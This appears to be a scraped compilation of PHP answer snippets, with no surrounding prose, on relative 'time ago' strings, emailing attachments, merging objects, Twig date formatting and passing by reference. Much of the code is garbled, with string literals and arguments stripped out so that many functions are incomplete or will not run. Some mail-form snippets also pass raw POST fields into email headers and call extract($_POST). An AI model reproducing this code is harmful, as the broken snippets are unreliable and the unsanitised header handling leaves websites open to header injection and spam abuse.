function calculate_time_span($seconds) { $year = floor($seconds /31556926); $months = floor($seconds /2629743); $week=floor($seconds /604800); $day = floor($seconds /86400); $hours = floor($seconds / 3600); $mins = floor(($seconds - ($hours*3600)) / 60); $secs = floor($seconds % 60); if($seconds < 60) $time = $secs." seconds ago"; else if($seconds < 3600 ) $time =($mins==1)?$mins."now":$mins." mins ago"; else if($seconds < 86400) $time = ($hours==1)?$hours." hour ago":$hours." hours ago"; else if($seconds < 604800) $time = ($day==1)?$day." day ago":$day." days ago"; else if($seconds < 2629743) $time = ($week==1)?$week." week ago":$week." weeks ago"; else if($seconds < 31556926) $time =($months==1)? $months." month ago":$months." months ago"; else $time = ($year==1)? $year." year ago":$year." years ago"; return $time; } $seconds = time() - strtotime($post->post_date); echo calculate_time_span($seconds);
function time_elapsed_string($ptime) { $ptime = strtotime($ptime); $csqltime = date( $ctime = strtotime($csqltime); $etime = $ctime - $ptime; if ($etime < 1){ return } $a = array( 365 * 24 * 60 * 60 => 30 * 24 * 60 * 60 => 24 * 60 * 60 => 60 * 60 => 60 => 1 => ); $a_plural = array( ); foreach ($a as $secs => $str){ $d = $etime / $secs; if ($d >= 1){ $r = floor($d); $rtime = $r * $secs; if(($etime - $rtime) < 0){ $etime -= ($r - 1) * $secs; } else{ $etime -= $rtime; } $estring = $estring . $r . } } return $estring . }
$datetime1 = new DateTime( $datetime2 = new DateTime( $difference = $datetime1->diff($datetime2); echo formatOutput($difference); function formatOutput($diff){ if(!is_object($diff)){ return; } if($diff->y > 0){ return $diff->y .(" year".($diff->y > 1?"s":"")." ago"); } if($diff->m > 0){ return $diff->m .(" month".($diff->m > 1?"s":"")." ago"); } if($diff->d > 0){ return $diff->d .(" day".($diff->d > 1?"s":"")." ago"); } if($diff->h > 0){ return $diff->h .(" hour".($diff->h > 1?"s":"")." ago"); } if($diff->i > 0){ return $diff->i .(" minute".($diff->i > 1?"s":"")." ago"); } if($diff->s > 0){ return $diff->s .(" second".($diff->s > 1?"s":"")." ago"); } }
<?php function calculate_time_span($post_time) { $seconds = time() - strtotime($post); $year = floor($seconds /31556926); $months = floor($seconds /2629743); $week=floor($seconds /604800); $day = floor($seconds /86400); $hours = floor($seconds / 3600); $mins = floor(($seconds - ($hours*3600)) / 60); $secs = floor($seconds % 60); if($seconds < 60) $time = $secs." seconds ago"; else if($seconds < 3600 ) $time =($mins==1)?$mins."now":$mins." mins ago"; else if($seconds < 86400) $time = ($hours==1)?$hours." hour ago":$hours." hours ago"; else if($seconds < 604800) $time = ($day==1)?$day." day ago":$day." days ago"; else if($seconds < 2629743) $time = ($week==1)?$week." week ago":$week." weeks ago"; else if($seconds < 31556926) $time =($months==1)? $months." month ago":$months." months ago"; else $time = ($year==1)? $year." year ago":$year." years ago"; return $time; }
$secs = time() - $time_ago; $sec_per_day = 60*60*24; $days_elapsed = floor($secs / $sec_per_day); $today_seconds = date( $remain_seconds = $secs % $sec_per_day; if($today_seconds < $remain_seconds) { $days_elapsed++; } echo
function ago($d) { $ts = time() - strtotime(str_replace("-","/",$d)); if($ts>315360000) $val = round($ts/31536000,0). else if($ts>94608000) $val = round($ts/31536000,0). else if($ts>63072000) $val = else if($ts>31536000) $val = else if($ts>24192000) $val = round($ts/2419200,0). else if($ts>7257600) $val = round($ts/2419200,0). else if($ts>4838400) $val = else if($ts>2419200) $val = else if($ts>6048000) $val = round($ts/604800,0). else if($ts>1814400) $val = round($ts/604800,0). else if($ts>1209600) $val = else if($ts>604800) $val = else if($ts>864000) $val = round($ts/86400,0). else if($ts>259200) $val = round($ts/86400,0). else if($ts>172800) $val = else if($ts>86400) $val = else if($ts>36000) $val = round($ts/3600,0). else if($ts>10800) $val = round($ts/3600,0). else if($ts>7200) $val = else if($ts>3600) $val = else if($ts>600) $val = round($ts/60,0). else if($ts>180) $val = round($ts/60,0). else if($ts>120) $val = else if($ts>60) $val = else if($ts>10) $val = round($ts,0). else if($ts>2) $val = round($ts,0). else if($ts>1) $val = else $val = $ts. return $val; }
$commentTime = strtotime($whatever) $today = strtotime( $yesterday = strtotime( $todaysHours = strtotime( private function timeElapsedString( $commentTime, $todaysHours, $today, $yesterday ) { $tokens = array( 31536000 => 2592000 => 604800 => 86400 => 3600 => 60 => 1 => ); $time = time() - $commentTime; $time = ($time < 1) ? 1 : $time; if ($commentTime >= $today || $commentTime < $yesterday) { foreach ($tokens as $unit => $text) { if ($time < $unit) { continue; } if ($text == $numberOfUnits = floor(($time - $todaysHours) / $unit) + 1; } else { $numberOfUnits = floor(($time)/ $unit); } return $numberOfUnits . } } else { return } }
$time_ago = $time = time() - $time; $tokens = array ( 31536000 => 60 => foreach ($tokens as $unit => $text) { if ($time < $unit)continue; $numberOfUnits = floor($time / $unit); $time_ago = $time = $time % $unit;}echo $time_ago;
function getHowLongAgo($date, $display = array( date_default_timezone_set( $timestamp = strtotime($date); $timestamp = (int) $timestamp; $current_time = time(); $diff = $current_time - $timestamp; $intervals = array( ); if ($diff == 0) { return } if ($diff < 60) { return $diff == 1 ? $diff . } if ($diff >= 60 && $diff < $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } if ($diff >= $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } if ($diff >= $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } if ($diff >= $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } if ($diff >= $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } if ($diff >= $intervals[ $diff = floor($diff / $intervals[ return $diff == 1 ? $diff . } }
function humanizeDateDiffference($now,$otherDate=null,$offset=null){ if($otherDate != null){ $offset = $now - $otherDate; } if($offset != null){ $deltaS = $offset%60; $offset /= 60; $deltaM = $offset%60; $offset /= 60; $deltaH = $offset%24; $offset /= 24; $deltaD = ($offset > 1)?ceil($offset):$offset; } else{ throw new Exception("Must supply otherdate or offset (from now)"); } if($deltaD > 1){ if($deltaD > 365){ $years = ceil($deltaD/365); if($years ==1){ return "last year"; } else{ return "<br>$years years ago"; } } if($deltaD > 6){ return date( } return "$deltaD days ago"; } if($deltaD == 1){ return "Yesterday"; } if($deltaH == 1){ return "last hour"; } if($deltaM == 1){ return "last minute"; } if($deltaH > 0){ return $deltaH." hours ago"; } if($deltaM > 0){ return $deltaM." minutes ago"; } else{ return "few seconds ago"; } }
function elapsed_time($time){ $diff = time() - strtotime($time); $sec = $diff; $min = floor($diff/60); $hour = floor($diff/(60*60)); $hour_min = floor($min - ($hour*60)); $day = floor($diff/(60*60*24)); $day_hour = floor($hour - ($day*24)); $week = floor($diff/(60*60*24*7)); $mon = floor($diff/(60*60*24*7*4)); $year = floor($diff/(60*60*24*7*4*12)); if($sec < (60*5)){ return }elseif($min < 60){ return }elseif($hour < 24){ return $hour. }elseif($day < 7){ if($day_hour!=0){$day_hour=$day_hour. return $day. }elseif($week < 4){ return $week. }elseif($mon < 12){ return $mon. }else{ return $year. } }
function timeElapsed($originalTime){ $timeElapsed=time()-$originalTime; /* You can change the values of the following 2 variables based on your opinion. For 100% accuracy, you can call php using the values you get for each month. After all the coding, your final answer will be approximately equal to mine. That is why it is okay to simply use the average values below. */ $averageNumbDaysPerMonth=(365.242/12); $averageNumbWeeksPerMonth=($averageNumbDaysPerMonth/7); $time1=(((($timeElapsed/60)/60)/24)/365.242); $time2=floor($time1); $time3=($time1-$time2)*(365.242); $time4=($time3/$averageNumbDaysPerMonth); $time5=floor($time4); $time6=($time4-$time5)*$averageNumbWeeksPerMonth; $time7=floor($time6); $time8=($time6-$time7)*7; $time9=floor($time8); $time10=($time8-$time9)*24; $time11=floor($time10); $time12=($time10-$time11)*60; $time13=floor($time12); $time14=($time12-$time13)*60; $time15=round($time14); $timeElapsed=$time2 . . $time13 . return $timeElapsed; }
public function getTimeDifference($time) { $currentTime = date( $toTime = strtotime($currentTime); $fromTime = strtotime($time); $timeDiff = floor(abs($toTime - $fromTime) / 60); if ($timeDiff < 2) { $timeDiff = "Just now"; } elseif ($timeDiff > 2 && $timeDiff < 60) { $timeDiff = floor(abs($timeDiff)) . " minutes ago"; } elseif ($timeDiff > 60 && $timeDiff < 120) { $timeDiff = floor(abs($timeDiff / 60)) . " hour ago"; } elseif ($timeDiff < 1440) { $timeDiff = floor(abs($timeDiff / 60)) . " hours ago"; } elseif ($timeDiff > 1440 && $timeDiff < 2880) { $timeDiff = floor(abs($timeDiff / 1440)) . " day ago"; } elseif ($timeDiff > 2880) { $timeDiff = floor(abs($timeDiff / 1440)) . " days ago"; } return $timeDiff; }
date_default_timezone_set( function convert($datetime){ $time=strtotime($datetime); $diff=time()-$time; $diff/=60; $var1=floor($diff); $var=$var1<=1 ? if($diff>=60){ $diff/=60; $var1=floor($diff); $var=$var1<=1 ? if($diff>=24){$diff/=24;$var1=floor($diff);$var=$var1<=1 ? if($diff>=30.4375){$diff/=30.4375;$var1=floor($diff);$var=$var1<=1 ? if($diff>=12){$diff/=12;$var1=floor($diff);$var=$var1<=1 ? echo $var1, }
function _ago($tm,$rcs = 0) { $cur_tm = time(); $dif = $cur_tm-$tm; $pds = array( $lngh = array(1,60,3600,86400,604800,2630880,31570560,315705600); for($v = sizeof($lngh)-1; ($v >= 0)&&(($no = $dif/$lngh[$v])<=1); $v--); if($v < 0) $v = 0; $_tm = $cur_tm-($dif%$lngh[$v]); $no = floor($no); if($no <> 1) $pds[$v] .= if(($rcs == 1)&&($v >= 1)&&(($cur_tm-$_tm) > 0)) $x .= time_ago($_tm); return $x; }
function timeDifference($timestamp) { $otherDate=$timestamp; $now=@date("Y-m-d H:i:s"); $secondDifference=@strtotime($now)-@strtotime($otherDate); $extra=""; if ($secondDifference == 2592000) { $difference = $secondDifference/2592000; $difference = round($difference,0); if ($difference>1) { $extra="s"; } $difference = $difference." month".$extra." ago"; }else if($secondDifference > 2592000) {$difference=timestamp($timestamp);} elseif ($secondDifference >= 604800) { $difference = $secondDifference/604800; $difference = round($difference,0); if ($difference>1) { $extra="s"; } $difference = $difference." week".$extra." ago"; } elseif ($secondDifference >= 86400) { $difference = $secondDifference/86400; $difference = round($difference,0); if ($difference>1) { $extra="s"; } $difference = $difference." day".$extra." ago"; } elseif ($secondDifference >= 3600) { $difference = $secondDifference/3600; $difference = round($difference,0); if ($difference>1) { $extra="s"; } $difference = $difference." hour".$extra." ago"; } elseif ($secondDifference < 3600) { if($secondDifference<=60) { if($secondDifference==0) { $secondDifference=1; } if ($secondDifference>1) { $extra="s"; } $difference = $secondDifference." second".$extra." ago"; } else { $difference = $secondDifference/60; if ($difference>1) { $extra="s"; }else{$extra="";} $difference = round($difference,0); $difference = $difference." minute".$extra." ago"; } } $FinalDifference = $difference; return $FinalDifference; }
$to = "xxx"; $subject = "Subject" ; $message = $headers = $headers .= $headers .= mail($to,$subject,$message,$headers);
use PHPMailer\PHPMailer\PHPMailer; use PHPMailer\PHPMailer\Exception; $email = new PHPMailer(); $email->SetFrom( $email->Subject = $email->Body = $bodytext; $email->AddAddress( $file_to_attach = $email->AddAttachment( $file_to_attach , return $email->Send();
$filename = $path = $file = $path . "/" . $filename; $mailto = $subject = $message = $content = file_get_contents($file); $content = chunk_split(base64_encode($content)); $separator = md5(time()); $eol = "\r\n"; $headers = "From: name <test@test.com>" . $eol; $headers .= "MIME-Version: 1.0" . $eol; $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol; $headers .= "Content-Transfer-Encoding: 7bit" . $eol; $headers .= "This is a MIME encoded message." . $eol; $body = "--" . $separator . $eol; $body .= "Content-Type: text/plain; charset=\"iso-8859-1\"" . $eol; $body .= "Content-Transfer-Encoding: 8bit" . $eol; $body .= $message . $eol; $body .= "--" . $separator . $eol; $body .= "Content-Type: application/octet-stream; name=\"" . $filename . "\"" . $eol; $body .= "Content-Transfer-Encoding: base64" . $eol; $body .= "Content-Disposition: attachment" . $eol; $body .= $content . $eol; $body .= "--" . $separator . "--"; if (mail($mailto, $subject, $body, $headers)) { echo "mail send ... OK"; } else { echo "mail send ... ERROR!"; print_r( error_get_last() ); }
$file = $path.$filename; $content = file_get_contents( $file); $content = chunk_split(base64_encode($content)); $uid = md5(uniqid(time())); $name = basename($file); $header = "From: ".$from_name." <".$from_mail.">\r\n"; $header .= "Reply-To: ".$replyto."\r\n"; $header .= "MIME-Version: 1.0\r\n"; $header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n"; $nmessage = "--".$uid."\r\n"; $nmessage .= "Content-type:text/plain; charset=iso-8859-1\r\n"; $nmessage .= "Content-Transfer-Encoding: 7bit\r\n\r\n"; $nmessage .= $message."\r\n\r\n"; $nmessage .= "--".$uid."\r\n"; $nmessage .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n"; $nmessage .= "Content-Transfer-Encoding: base64\r\n"; $nmessage .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n"; $nmessage .= $content."\r\n\r\n"; $nmessage .= "--".$uid."--"; if (mail($mailto, $subject, $nmessage, $header)) { return true; } else { return false; }
$message = Swift_Message::newInstance() ->setSubject( ->setFrom(array( ->setTo(array( ->setBody( ->attach(Swift_Attachment::fromPath( $mailer->send($message);
<?php $to = $subject = $random_hash = md5(date( $headers = "From: webmaster@example.com\r\nReply-To: webmaster@example.com"; $headers .= "\r\nContent-Type: multipart/mixed; boundary=\"PHP-mixed-".$random_hash."\""; $attachment = chunk_split(base64_encode(file_get_contents( ob_start(); ?> --PHP-mixed-<?php echo $random_hash; ?> Content-Type: multipart/alternative; boundary="PHP-alt-<?php echo $random_hash; ?>" --PHP-alt-<?php echo $random_hash; ?> Content-Type: text/plain; charset="iso-8859-1" Content-Transfer-Encoding: 7bit Hello World!!! This is simple text email message. --PHP-alt-<?php echo $random_hash; ?> Content-Type: text/html; charset="iso-8859-1" Content-Transfer-Encoding: 7bit <h2>Hello World!</h2> <p>This is something with <b>HTML</b> formatting.</p> --PHP-alt-<?php echo $random_hash; ?>-- --PHP-mixed-<?php echo $random_hash; ?> Content-Type: application/zip; name="attachment.zip" Content-Transfer-Encoding: base64 Content-Disposition: attachment <?php echo $attachment; ?> --PHP-mixed-<?php echo $random_hash; ?>-- <?php $message = ob_get_clean(); $mail_sent = @mail( $to, $subject, $message, $headers ); echo $mail_sent ? "Mail sent" : "Mail failed"; ?>
$email = new PHPMailer(); $email->From = $email->FromName = $email->Subject = $email->Body = $email->AddAddress( $email->AddAttachment( "/path/to/file" , "filename.ext", $email->Send();
<?php if ($_POST && isset($_FILES[ $recipient_email = "recipient@yourmail.com"; $from_email = "info@your_domain.com"; $subject = "Attachment email from your website!"; $sender_name = filter_var($_POST["s_name"], FILTER_SANITIZE_STRING); $sender_email = filter_var($_POST["s_email"], FILTER_SANITIZE_STRING); $sender_message = filter_var($_POST["s_message"], FILTER_SANITIZE_STRING); $attachments = $_FILES[ if (strlen($sender_name) < 4) { die( } if (!filter_var($sender_email, FILTER_VALIDATE_EMAIL)) { die( } if (strlen($sender_message) < 4) { die( } $file_count = count($attachments[ $boundary = md5("specialToken$4332"); if ($file_count > 0) { $headers = "MIME-Version: 1.0\r\n"; $headers .= "From:" . $from_email . "\r\n"; $headers .= "Reply-To: " . $sender_email . "" . "\r\n"; $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; $body = "--$boundary\r\n"; $body .= "Content-Type: text/plain; charset=ISO-8859-1\r\n"; $body .= "Content-Transfer-Encoding: base64\r\n\r\n"; $body .= chunk_split(base64_encode($sender_message)); for ($x = 0; $x < $file_count; $x++) { if (!empty($attachments[ if ($attachments[ $mymsg = array( 1 => "The uploaded file exceeds the upload_max_filesize directive in php.ini", 2 => "The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form", 3 => "The uploaded file was only partially uploaded", 4 => "No file was uploaded", 6 => "Missing a temporary folder"); die($mymsg[$attachments[ } $file_name = $attachments[ $file_size = $attachments[ $file_type = $attachments[ $handle = fopen($attachments[ $content = fread($handle, $file_size); fclose($handle); $encoded_content = chunk_split(base64_encode($content)); $body .= "--$boundary\r\n"; $body .= "Content-Type: $file_type; name=" . $file_name . "\r\n"; $body .= "Content-Disposition: attachment; filename=" . $file_name . "\r\n"; $body .= "Content-Transfer-Encoding: base64\r\n"; $body .= "X-Attachment-Id: " . rand(1000, 99999) . "\r\n\r\n"; $body .= $encoded_content; } } } else { $headers = "From:" . $from_email . "\r\n" . "Reply-To: " . $sender_email . "\n" . "X-Mailer: PHP/" . phpversion(); $body = $sender_message; } $sentMail = @mail($recipient_email, $subject, $body, $headers); if ($sentMail) { die( } else { die( } } ?>
if (isset($_POST[ $mailto = $_POST["mailTo"]; $from_mail = $_POST["fromEmail"]; $replyto = $_POST["fromEmail"]; $from_name = $_POST["fromName"]; $message = $_POST["message"]; $subject = $_POST["subject"]; $filename = $_FILES["fileAttach"]["name"]; $content = chunk_split(base64_encode(file_get_contents($_FILES["fileAttach"]["tmp_name"]))); $uid = md5(uniqid(time())); $name = basename($file); $header = "From: " . $from_name . " <" . $from_mail . ">\r\n"; $header .= "Reply-To: " . $replyto . "\r\n"; $header .= "MIME-Version: 1.0\r\n"; $header .= "Content-Type: multipart/mixed; boundary=\"" . $uid . "\"\r\n\r\n"; $header .= "This is a multi-part message in MIME format.\r\n"; $header .= "--" . $uid . "\r\n"; $header .= "Content-type:text/html; charset=utf-8\n"; $header .= "Content-Transfer-Encoding: 7bit\r\n\r\n"; $header .= "<div style= $header .= "--" . $uid . "\r\n"; $header .= "Content-Type: application/octet-stream; name=\"" . $filename . "\"\r\n"; $header .= "Content-Transfer-Encoding: base64\r\n"; $header .= "Content-Disposition: attachment; filename=\"" . $filename . "\"\r\n\r\n"; $header .= $content . "\r\n\r\n"; $header .= "--" . $uid . "--"; if (mail($mailto, $subject, "", $header)) { echo "<script>alert( } else { echo "<script>alert( } }
<?php $to = "email1@domain.com, email2@domain.com"; $from = "sent_from@domain.com"; $subject = "Your PDF email subject"; $body = "<p>The PDF is attached.</p>"; $pdfLocation = "./your-pdf.pdf"; $pdfName = "pdf-file.pdf"; $filetype = "application/pdf"; $eol = PHP_EOL; $semi_rand = md5(time()); $mime_boundary = "==Multipart_Boundary_$semi_rand"; $headers = "From: $from$eolMIME-Version: 1.0$eol" . "Content-Type: multipart/mixed;$eol boundary=\"$mime_boundary\""; $message = "--$mime_boundary$eol" . "Content-Type: text/html; charset=\"iso-8859-1\"$eol" . "Content-Transfer-Encoding: 7bit$eol$eol$body$eol"; $file = fopen($pdfLocation, $data = fread($file, filesize($pdfLocation)); fclose($file); $pdf = chunk_split(base64_encode($data)); $message .= "--$mime_boundary$eol" . "Content-Type: $filetype;$eol name=\"$pdfName\"$eol" . "Content-Disposition: attachment;$eol filename=\"$pdfName\"$eol" . "Content-Transfer-Encoding: base64$eol$eol$pdf$eol--$mime_boundary--"; if(mail($to, $subject, $message, $headers)) { echo "The email was sent."; } else { echo "There was an error sending the mail."; }
<?php # # # # # function email2($args) { if (!isset($args[ $from = $args[ if (!isset($args[ $to = $args[ $subject = isset($args[ $reply_to = isset($args[ $cc = isset($args[ $bcc = isset($args[ $subject = isset($args[ $subject = preg_replace("|[^a-z0-9 _/ $headers = "From: $from"; if($reply_to) { $headers .= PHP_EOL . "Reply-To: $reply_to"; } if($cc) { $headers .= PHP_EOL . "CC: $cc"; } if($bcc) { $headers .= PHP_EOL . "BCC: $bcc"; } $r = email2_helper($args[ $headers .= PHP_EOL . $r[0]; $body = $r[1]; if (mail($to, $subject, $body, $headers)) { return 0; } else { return 5; } } function email2_helper($body, $top = true) { if (is_string($body)) { if (substr($body, 0, 1) == return email2_helper(array( } else { return email2_helper(array( } } $type = $mime = false; $boundary = null; $disposition = null; $charset = false; if (isset($body[ $type = $body[ if ($type === $type = $charset = true; } elseif ($type === $type = $charset = true; } elseif ($type === $mime = true; $type = } elseif ($type === $mime = true; $type = } } if (isset($body[ $disposition = $body[ } if (isset($body[ if ($disposition == null) { $disposition = } $disposition .= "; filename=\"{$body[ $type .= "; name=\"{$body[ } $headers = array(); if ($top && $mime) { $headers[] = } if ($mime) { $boundary = md5( $type .= "; boundary=$boundary"; } if ($charset) { $type .= } $headers[] = "Content-Type: $type"; if ($disposition !== null) { $headers[] = "Content-Disposition: {$disposition}"; } $data = if ($mime) { foreach ($body[ $data .= "--$boundary" . PHP_EOL; $r = email2_helper($sub_body, false); $data .= $r[0] . PHP_EOL . PHP_EOL; $data .= $r[1] . PHP_EOL . PHP_EOL; } $data .= "--$boundary--"; } else { if(preg_match( $headers[] = "Content-Transfer-Encoding: base64"; $data .= chunk_split(base64_encode($body[ } else { $data .= $body[ } } return array(join(PHP_EOL, $headers), $data); }
$to = "to@gmail.com"; $subject = "Subject Of The Mail"; $message = "Hi there,<br/><br/>This is my message.<br><br>"; $headers = "From: From-Name<from@gmail.com>"; $semi_rand = md5(time()); $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x"; $headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\""; $message = "This is a multi-part message in MIME format.\n\n" . "--{$mime_boundary}\n" . "Content-Type: text/html; charset=ISO-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n"; $message .= "--{$mime_boundary}\n"; $filepath = move_uploaded_file($_FILES[ $filename = $_FILES[ $file = fopen($filepath, "rb"); $data = fread($file, filesize($filepath)); fclose($file); $data = chunk_split(base64_encode($data)); $message .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$filename\"\n" . "Content-Disposition: attachment;\n" . " filename=\"$filename\"\n" . "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n"; $message .= "--{$mime_boundary}\n"; mail($to, $subject, $message, $headers);
<?php function mail_attachment($filename, $path, $mailto, $from_mail, $from_name, $replyto, $subject, $message) { $file = $path.$filename; $file_size = filesize($file); $handle = fopen($file, "r"); $content = fread($handle, $file_size); fclose($handle); $content = chunk_split(base64_encode($content)); $uid = md5(uniqid(time())); $header = "From: ".$from_name." <".$from_mail.">\r\n"; $header .= "Reply-To: ".$replyto."\r\n"; $header .= "MIME-Version: 1.0\r\n"; $header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n"; $header .= "This is a multi-part message in MIME format.\r\n"; $header .= "--".$uid."\r\n"; $header .= "Content-type:text/plain; charset=iso-8859-1\r\n"; $header .= "Content-Transfer-Encoding: 7bit\r\n\r\n"; $header .= $message."\r\n\r\n"; $header .= "--".$uid."\r\n"; $header .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n"; $header .= "Content-Transfer-Encoding: base64\r\n"; $header .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n"; $header .= $content."\r\n\r\n"; $header .= "--".$uid."--"; if (mail($mailto, $subject, "", $header)) { echo "mail send ... OK"; } else { echo "mail send ... ERROR!"; } } $my_file = "somefile.zip"; $my_path = "/your_path/to_the_attachment/"; $my_name = "Olaf Lederer"; $my_mail = "my@mail.com"; $my_replyto = "my_reply_to@mail.net"; $my_subject = "This is a mail with attachment."; $my_message = "Hallo,\r\ndo you like this script? I hope it will help.\r\n\r\ngr. Olaf"; mail_attachment($my_file, $my_path, "recipient@mail.org", $my_mail, $my_name, $my_replyto, $my_subject, $my_message); ?>
if (isset($_POST[ extract($_POST); require_once( $subject = "$name Applied For - $position"; $email_message = "<div>Thanks for Applying ....</div> "; $mail = new PHPMailer; $mail->IsSMTP(); $mail->Host = "mail.companyname.com"; $mail->SMTPDebug = 0; $mail->SMTPAuth = true; $mail->SMTPSecure = "ssl"; $mail->Host = "smtp.gmail.com"; $mail->Port = 465; $mail->IsHTML(true); $mail->Username = "info@companyname.com"; $mail->Password = "mailPassword"; $mail->SetFrom( $mail->AddReplyTo("name@yourdomain.com","First Last"); $mail->Subject = "your subject"; $mail->AltBody = "To view the message, please use an HTML compatible email viewer!"; $mail->MsgHTML($email_message); $address = $mail->AddAddress($address, "companyname"); $mail->AddAttachment($_FILES[ if (!$mail->Send()) { echo } else { echo } }
$objectA->a; $objectA->b; $objectB->c; $objectB->d; $objectC->a; $objectC->b; $objectC->c; $objectC->d;
$obj_merged = (object) array_merge((array) $obj1, (array) $obj2);
$obj_merged = (object) array_merge((array) $obj1, (array) $obj2);
class Compositor { private $obj_a; private $obj_b; public function __construct($obj_a, $obj_b) { $this->obj_a = $obj_a; $this->obj_b = $obj_b; } public function __get($attrib_name) { if ($this->obj_a->$attrib_name) { return $this->obj_a->$attrib_name; } else { return $this->obj_b->$attrib_name; } } }
class Compositor { protected $composite = array(); protected $use_reference; protected $first_precedence; /** * __construct, Constructor * * Used to set options. * * @param bool $use_reference whether to use a reference (TRUE) or to copy the object (FALSE) [default] * @param bool $first_precedence whether the first entry takes precedence (TRUE) or last entry takes precedence (FALSE) [default] */ public function __construct($use_reference = FALSE, $first_precedence = FALSE) { $this->use_reference = $use_reference === TRUE ? TRUE : FALSE; $this->first_precedence = $first_precedence === TRUE ? TRUE : FALSE; } /** * Merge, used to merge multiple objects stored in an array * * This is used to *start* the merge or to merge an array of objects. * It is not needed to start the merge, but visually is nice. * * @param object[]|object $objects array of objects to merge or a single object * @return object the instance to enable linking */ public function & merge() { $objects = func_get_args(); foreach($objects as &$object) $this->with($object); unset($object); return $this; } /** * With, used to merge a singluar object * * Used to add an object to the composition * * @param object $object an object to merge * @return object the instance to enable linking */ public function & with(&$object) { if(is_object($object)) { if($this->use_reference) { if($this->first_precedence) array_push($this->composite, $object); else array_unshift($this->composite, $object); } else { if($this->first_precedence) array_push($this->composite, clone $object); else array_unshift($this->composite, clone $object); } } return $this; } /** * __get, retrieves the psudo merged object * * @param string $name name of the variable in the object * @return mixed returns a reference to the requested variable * */ public function & __get($name) { $return = NULL; foreach($this->composite as &$object) { if(isset($object->$name)) { $return =& $object->$name; break; } } unset($object); return $return; } }
$obj = new Compositor(use_reference, first_precedence); $obj->merge([object $object [, object $object [, object $...]]]); $obj->with([object $object]);
$obj1 = new stdClass(); $obj1->a = $obj1->b = $obj1->c = $obj2 = new stdClass(); $obj2->a = $obj2->b = $obj2->d = $obj3 = new Compositor(); $obj3->merge($obj1, $obj2); $obj1->c = var_dump($obj3->a, $obj3->b, $obj3->c, $obj3->d); $obj1->c; $obj3 = new Compositor(TRUE); $obj3->merge($obj1)->with($obj2); $obj1->c = var_dump($obj3->a, $obj3->b, $obj3->c, $obj3->d); $obj1->c = $obj3 = new Compositor(FALSE, TRUE); $obj3->with($obj1)->with($obj2); $obj1->c = var_dump($obj3->a, $obj3->b, $obj3->c, $obj3->d); $obj1->c =
foreach($objB AS $var=>$value){ $objA->$var = $value; }
class combinator{ function __construct(){ $this->melt = array_reverse(func_get_args()); } public function __call($method,$args){ forEach($this->melt as $o){ if(method_exists($o, $method)){ return call_user_func_array([$o,$method], $args); } } } public function __get($prop){ foreach($this->melt as $o){ if(isset($o->$prop))return $o->$prop; } return } }
class c1{ public $pc1= function mc1($a,$b){echo __METHOD__." ".($a+$b);} } class c2{ public $pc2= function mc2(){echo __CLASS__." ".__METHOD__;} } $comb=new combinator(new c1, new c2); $comb->mc1(1,2); $comb->non_existing_method(); echo $comb->pc2;
$obj1->extra = new Class2(); $obj1->extra =& Factory::getInstance(
class MergeBase extends ArrayObject { public final function merge( Array $toMerge ) { $this->exchangeArray( array_merge( $this->getArrayCopy(), $toMerge ) ); } }
$base = new MergeBase(); $base[] = 1; $base[] = 2; $toMerge = [ 3,4,5, ]; $base->merge( $toMerge );
function merge_obj(){ foreach(func_get_args() as $a){ $objects[]=(array)$a; } return (object)call_user_func_array( }
function flatten($array, $preserve_keys=1, &$out = array(), $isobject=0) { # if(is_array($array) || $isobject==1) foreach($array as $key => $child) if(is_array($child)) $out = Functions::flatten($child, $preserve_keys, $out, 1); elseif($preserve_keys + is_string($key) > 1) $out[$key] = $child; else $out[] = $child; if(is_object($array) || $isobject==2) if(!is_object($out)){$out = new stdClass();} foreach($array as $key => $child) if(is_object($child)) $out = Functions::flatten($child, $preserve_keys, $out, 2); elseif($preserve_keys + is_string($key) > 1) $out->$key = $child; else $out = $child; return $out; }
function copy_properties($from, $to, $fields = null) { $from_array = is_array($from) ? $from : get_object_vars($from); foreach($from_array as $key => $val) { if(!is_array($fields) or in_array($key, $fields)) { if(is_object($to)) { $to->$key = $val; } else { $to[$key] = $val; } } } return($to); }
abstract class Util { public static function object_to_array($d) { if (is_object($d)) $d = get_object_vars($d); return is_array($d) ? array_map(__METHOD__, $d) : $d; } public static function array_to_object($d) { return is_array($d) ? (object) array_map(__METHOD__, $d) : $d; } }
function object_to_array($d) { if (is_object($d)) $d = get_object_vars($d); return is_array($d) ? array_map(__FUNCTION__, $d) : $d; } function array_to_object($d) { return is_array($d) ? (object) array_map(__FUNCTION__, $d) : $d; }
{% for game in games %} ... <td> {{game.gameTeamIdOne.teamName}} </td> <td> {{game.gameTeamIdTwo.teamName}} </td> <td> {{game.gameDate}}</td> </tr> {% endfor %}
/** * @var date $gameDate * * @ORM\Column(name="GAME_DATE", type="datetime", nullable=true) */ private $gameDate;
localizeddate( date_format, time_format [, locale ] )
/** * Set gameDate * * @ORM\PrePersist */ public function setGameDate() { $this->dateCreated = new \DateTime(); return $this; }
{{ user.createdAt|localeDate }} to have a medium date and no time, in the current locale {{ user.createdAt|localeDate(
<?php function add_some_extra(&$string) { $string .= } $str = add_some_extra($str); echo $str; ?>
<?php class Holder { private $value; public function __construct($value) { $this->value = $value; } public function getValue() { return $this->value; } } function swap($x, $y) { $tmp = $x; $x = $y; $y = $tmp; } $a = new Holder( $b = new Holder( swap($a, $b); echo $a->getValue() . ", " . $b->getValue() . "\n";
